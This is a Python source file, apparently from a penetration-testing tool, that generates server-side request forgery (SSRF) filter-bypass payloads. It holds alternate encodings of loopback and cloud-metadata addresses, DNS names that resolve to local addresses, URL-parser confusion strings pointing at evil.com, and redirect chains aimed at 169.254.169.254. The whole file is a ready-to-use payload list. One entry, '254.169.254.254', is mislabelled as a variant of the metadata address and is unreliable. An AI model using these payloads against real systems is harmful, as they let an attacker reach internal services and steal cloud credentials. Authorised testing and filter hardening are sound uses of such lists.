#!/usr/bin/env python3
"""
core/ssrf_payloads.py — Encoding-bypass payload generator for SSRF tests.

Covers decimal/hex/octal IPs, IPv6 forms, URL parser confusion,
DNS rebinding domains, and redirect chains.
"""

from typing import List

DECIMAL_OCTETS = {
    "127.0.0.1": [
        "127.0.0.1", "2130706433", "0x7f000001",
        "0177.0.0.1", "127.1", "0x7f.1", "127.0.1",
        "017700000001"
    ],
    "169.254.169.254": [
        "169.254.169.254", "2852039166",
        "0xa9fea9fe", "254.169.254.254",
        "169.254.169.254.nip.io"
    ],
    "0.0.0.0": ["0.0.0.0", "0", "0000"],
    "10.0.0.1": ["10.0.0.1", "167772161", "0x0a000001"],
}

DNS_BYPASS = [
    "localtest.me", "nip.io", "sslip.io", "lvh.me", "xip.io",
    "1.1.1.1.nip.io",
]

URL_CONFUSION = [
    "http://127.0.0.1@evil.com/",           # userinfo trick
    "http://evil.com#@127.0.0.1/",          # fragment trick
    "http://127.0.0.1%00@evil.com/",        # null byte
    "http://127.0.0.1.evil.com/",           # dot suffix
    "http://[::1]:80/",                     # IPv6 loopback
    "http://[::ffff:127.0.0.1]/",           # IPv4-mapped IPv6
    "http://0:0:0:0:0:ffff:7f00:1/",
    "http://127.0.0.1:80@evil.com:443/",
    "http://evil.com:80@127.0.0.1:443/",
    "http://127.0.0.1%2e%2eevil.com/",
]

REDIRECT_CHAINS = [
    "http://redirector-service/path?url=http://169.254.169.254/",
    "http://127.0.0.1:8080/redirect?to=http://169.254.169.254/",
]


def generate(include_meta: bool = True, include_dns: bool = True) -> List[str]:
    """Generate a list of unique SSRF bypass payloads."""
    out = []
    for host, variants in DECIMAL_OCTETS.items():
        if not include_meta and host not in ("0.0.0.0", "10.0.0.1"):
            continue
        for v in variants:
            out.append(f"http://{v}/")
            out.append(f"http://{v}:80/")
            out.append(f"https://{v}/")
    if include_dns:
        for d in DNS_BYPASS:
            out.append(f"http://{d}/")
            out.append(f"http://127.0.0.1.{d}/")
    out.extend(URL_CONFUSION)
    out.extend(REDIRECT_CHAINS)

    # Deduplicate preserving order
    return list(dict.fromkeys(out))


def test_smuggling_aware(payload: str) -> bool:
    """Heuristic: payloads needing raw TCP (smuggling) are not valid here."""
    return "\r\n" not in payload and "\n" not in payload
